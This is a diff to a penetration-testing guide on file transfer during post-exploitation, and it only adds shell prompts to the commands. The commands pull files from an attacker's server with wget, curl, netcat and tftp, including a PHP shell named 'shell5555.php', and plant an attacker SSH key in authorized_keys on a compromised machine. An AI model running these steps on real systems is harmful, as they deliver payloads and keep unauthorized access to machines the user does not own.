@@ -5,7 +5,7 @@
 For the examples using `curl` and `wget` we need to download from a web-server. This is an easy way to set up a web-server. This command will make the entire folder, from where you issue the command, available on port 9999.
 
 ```text
-python -m SimpleHTTPServer 9999
+$ python -m SimpleHTTPServer 9999
 ```
 
 ### Or using PHP
@@ -19,13 +19,13 @@ $ php -S 0.0.0.0:80    # choose whatever port you want at the end there.
 You can download files using `wget` like this:
 
 ```text
-wget 192.168.1.102:9999/file.txt
+$ wget 192.168.1.102:9999/file.txt
 ```
 
 ## Curl
 
 ```text
-curl -O http://192.168.0.101/file.txt
+$ curl -O http://192.168.0.101/file.txt
 ```
 
 ## Netcat
@@ -39,13 +39,13 @@ So instead you can connect from the target machine like this.
 On attacking machine:
 
 ```bash
-nc -lvp 4444 < file
+$ nc -lvp 4444 < file
 ```
 
 On target machine:
 
 ```bash
-nc 192.168.1.102 4444 > file
+$ nc 192.168.1.102 4444 > file
 ```
 
 You can of course also do it the risky way, the other way around:
@@ -53,13 +53,13 @@ You can of course also do it the risky way, the other way around:
 So on the victim-machine we run `nc` like this:
 
 ```bash
-nc -lvp 3333 > enum.sh
+$ nc -lvp 3333 > enum.sh
 ```
 
 And on the attacking machine we send the file like this:
 
 ```bash
-nc 192.168.1.103 < enum.sh
+$ nc 192.168.1.103 < enum.sh
 ```
 
 I have sometimes received this error:
@@ -71,7 +71,7 @@ This is nc from the netcat-openbsd package. An alternative nc is available
 I have just run this command instead:
 
 ```text
-nc -l 1234 > file.sh
+$ nc -l 1234 > file.sh
 ```
 
 ## Socat
@@ -112,7 +112,7 @@ tftp> get myfile.txt
 If we can't run it interactively, for whatever reason, we can do this trick:
 
 ```text
-tftp 191.168.0.101 <<< "get shell5555.php shell5555.php"
+$ tftp 191.168.0.101 <<< "get shell5555.php shell5555.php"
 ```
 
 ### SSH - SCP
@@ -127,7 +127,7 @@ Then you need to do two things.
 You do that with:
 
 ```text
-ssh-keygen -t rsa -C "your_email@example.com"
+$ ssh-keygen -t rsa -C "your_email@example.com"
 ```
 
 then you enter a name for the key.
@@ -144,7 +144,7 @@ Now you copy the content of `nameOfMyKey_pub`.
 On the compromised machine you go to `~/.ssh` and then run add the public key to the file authorized\_keys. Like this
 
 ```bash
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > authorized_keys
+$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > authorized_keys
 ```
 
 1. Log in.
@@ -152,7 +152,7 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW
 Now you should be all set to log in using your private key. Like this
 
 ```text
-ssh -i nameOfMyKey kim@192.168.1.103
+$ ssh -i nameOfMyKey kim@192.168.1.103
 ```
 
 ### SCP
